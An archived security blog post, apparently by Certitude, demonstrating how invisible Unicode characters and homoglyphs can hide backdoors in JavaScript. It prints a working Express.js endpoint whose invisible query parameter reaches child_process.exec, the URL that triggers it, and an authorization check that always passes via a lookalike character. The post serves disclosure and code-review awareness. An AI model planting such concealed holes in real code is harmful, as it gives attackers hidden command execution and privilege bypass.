{
    "id": "e356ea83-9bc8-4f46-a680-9a6d1a80af3f",
    "created_at": "2023-01-12T15:10:38.997887Z",
    "updated_at": "2025-03-27T02:05:28.679376Z",
    "deleted_at": null,
    "sha1_hash": "b41576bc61490cadd97095e59d2c4ba5a7f4a32d",
    "title": "2021-11-09 - The Invisible JavaScript Backdoor",
    "authors": "",
    "file_creation_date": "2022-05-28T00:29:15Z",
    "file_modification_date": "2022-05-28T00:29:15Z",
    "file_size": 210775,
    "plain_text": "# The Invisible JavaScript Backdoor\n\n**certitude.consulting/blog/en/invisible-backdoor/**\n\nWolfgang Ettlinger 09.11.2021\n\n[A few months ago we saw a post on the r/programminghorror subreddit: A developer](https://www.reddit.com/r/programminghorror/comments/o9dm6r/i_was_getting_errors_and_couldnt_pinpoint_it/)\ndescribes the struggle of identifying a syntax error resulting from an invisible Unicode\ncharacter hidden in JavaScript source code. This post inspired an idea: What if a backdoor\n_literally cannot be seen and thus evades detection even from thorough code reviews?_\n\nJust as we were finishing up this blog post, a team at the University of Cambridge released a\n[paper describing such an attack. Their approach, however, is quite different from ours – it](https://www.trojansource.codes/)\nfocuses on the Unicode bidirectional mechanism (Bidi). We have implemented a different\ntake on what the paper titles “Invisible Character Attacks” and “Homoglyph Attacks“.\n\nWithout further ado, here’s the backdoor. Can you spot it?\n```\nconst express = require('express');\nconst util = require('util');\nconst exec = util.promisify(require('child_process').exec);\nconst app = express();\napp.get('/network_health', async (req, res) => {\n  const { timeout,ㅤ} = req.query;\n  const checkCommands = [\n    'ping -c 1 google.com',\n    'curl -s http://example.com/',ㅤ\n  ];\n  try {\n    await Promise.all(checkCommands.map(cmd => \n        cmd && exec(cmd, { timeout: +timeout || 5_000 })));\n    res.status(200);\n    res.send('ok');\n  } catch(e) {\n    res.status(500);\n    res.send('failed');\n  }\n});\napp.listen(8080);\n\n```\nThe script implements a very simple network health check HTTP endpoint that executes\n```\nping -c 1 google.com as well as curl -s http://example.com and returns whether\n\n```\nthese commands executed successfully. The optional HTTP parameter `timeout limits the`\ncommand execution time.\n\n\n-----\n\n## The Backdoor\n\nOur approach for creating the backdoor was to first, find an invisible Unicode character that\ncan be interpreted as an identifier/variable in JavaScript. Beginning with ECMAScript version\n2015, all Unicode characters with the Unicode property `ID_Start can be used in identifiers`\n(characters with property `ID_Continue can be used after the initial character).`\n\nThe character “” (0x3164 in hex) is called ㅤ _“HANGUL FILLER” and belongs to the Unicode_\ncategory “Letter, other”. As this character is considered to be a letter, it has the `ID_Start`\nproperty and can therefore appear in a JavaScript variable – perfect!\n\nNext, a way to use this invisible character unnoticed had to be found. The following\nvisualizes the chosen approach by replacing the character in question with its escape\n_sequence representation:_\n```\n  const { timeout,\\u3164} = req.query;\n\n```\nA [destructuring assignment is used to deconstruct the HTTP parameters from](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment) `req.query .`\nContrary to what can be seen, the parameter `timeout is not the sole parameter unpacked`\nfrom the `req.query attribute! An additional variable/HTTP parameter named “” is retrievedㅤ`\n– if a HTTP parameter named “” is passed, it is assigned to the invisible variable ㅤ ㅤ .\n\nSimilarly, when the `checkCommands array is constructed, this variable` ㅤ is included into the\narray:\n```\n  const checkCommands = [\n    'ping -c 1 google.com',\n    'curl -s http://example.com/',\\u3164\n  ];\n\n```\nEach element in the array, the hardcoded commands as well as the user-supplied parameter,\nis then passed to the `exec function. This function executes OS commands. For an attacker`\nto execute arbitrary OS commands, they would have to pass a parameter named “” (in it’sㅤ\nURL-encoded form) to the endpoint:\n```\nhttp://host:8080/network_health?%E3%85%A4=<any command>\n\n```\nThis approach cannot be detected through syntax highlighting as invisible characters are not\nshown at all and therefore are not colorized by the IDE/text editor:\n\n\n-----\n\nThe attack requires the IDE/text editor (and the used font) to correctly render the invisible\ncharacters. At least Notepad++ and VS Code render it correctly (in VS Code the invisible\ncharacter is slightly wider than ASCII characters). The script behaves as described at least\nwith Node 14.\n\n## Homoglyph Approaches\n\nBesides invisible characters one could also introduce backdoors using Unicode characters\nthat look very similar to e.g. operators:\n\n\n-----\n\n```\nconst [ ENV_PROD, ENV_DEV ] [ PRODUCTION, DEVELOPMENT ];\n/* … */\nconst environment = 'PRODUCTION';\n/* … */\nfunction isUserAdmin(user) {\n  if(environmentǃ=ENV_PROD){\n    // bypass authZ checks in DEV\n    return true;\n  }\n  /* … */\n  return false;\n}\n\n```\nThe “ǃ” character used is not an exclamation mark but an “ALVEOLAR CLICK” character. The\nfollowing line therefore does not compare the variable `environment to the string`\n```\n\"PRODUCTION\" but instead assigns the string \"PRODUCTION\" to the previously undefined\n\n```\nvariable `environmentǃ :`\n```\n  if(environmentǃ=ENV_PROD){\n\n```\nThus, the expression within the if statement is always `true (tested with Node 14).`\n\nThere are many other characters that look similar to the ones used in code which may be\nused for such proposes (e.g. “／”, “−”, “＋”, “�”, “❨”, “�”, “�”, “∗”). Unicode calls these\n[characters “confusables”.](https://unicode.org/reports/tr36/#visual_spoofing)\n\n## Takeaway\n\n[Note that messing with Unicode to hide vulnerable or malicious code is not](https://github.com/NebulousLabs/glyphcheck) [a](https://twitter.com/zygoloid/status/1187150150835195905) [new](https://github.com/golang/go/issues/20209) [idea (also](https://twitter.com/jupenur/status/1244286243518713857)\nusing [invisible characters) and Unicode inherently opens up additional possibilities to](https://mobile.twitter.com/veorq/status/843382644939374592)\n[obfuscate code. We believe that these tricks are quite neat though, which is why we wanted](https://twitter.com/FiloSottile/status/1455260886910783501)\nto share them.\n\nUnicode should be kept in mind when doing reviews of code from unknown or untrusted\ncontributors. This is especially interesting for open source projects as they might receive\ncontributions from developers that are effectively anonymous.\n\nThe Cambridge team proposes restricting Bidi Unicode characters. As we have shown,\nhomoglyph attacks and invisible characters can pose a threat as well. In our experience nonASCII characters are pretty rare in code. Many development teams chose to use English as\nthe primary development language (both for code and strings within the code) in order to\nallow for international cooperation (ASCII covers all/most characters used in the English\nlanguage). Translation into other languages is often done using dedicated files. When we\nreview German language code, we mostly see non-ASCII characters being substituted with\nASCII characters (e.g. ä → ae, ß → ss). It might therefore be a good idea to disallow any\nnon-ASCII characters.\n\n\n-----\n\n**Update:**\n\nVS Code has issued an update that highlights invisible characters and confusables:\n[https://code.visualstudio.com/updates/v1_63#_unicode-highlighting](https://code.visualstudio.com/updates/v1_63#_unicode-highlighting)\n\nUnicode is forming a task force to investigate issues with source code spoofing:\n[https://www.unicode.org/L2/L2022/22007-avoiding-spoof.pdf](https://www.unicode.org/L2/L2022/22007-avoiding-spoof.pdf)\n\nCertitude’s employees have many years of experience in code reviews and expertise in\nmany languages and frameworks. If you are interested in working with Certitude to improve\nyour application’s security, feel free to reach out to us at office@certitude.consulting.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-09 - The Invisible JavaScript Backdoor.pdf"
    ],
    "report_names": [
        "2021-11-09 - The Invisible JavaScript Backdoor.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536238,
    "ts_updated_at": 1743041128,
    "ts_creation_date": 1653697755,
    "ts_modification_date": 1653697755,
    "files": {
        "pdf": "https://archive.orkl.eu/b41576bc61490cadd97095e59d2c4ba5a7f4a32d.pdf",
        "text": "https://archive.orkl.eu/b41576bc61490cadd97095e59d2c4ba5a7f4a32d.txt",
        "img": "https://archive.orkl.eu/b41576bc61490cadd97095e59d2c4ba5a7f4a32d.jpg"
    }
}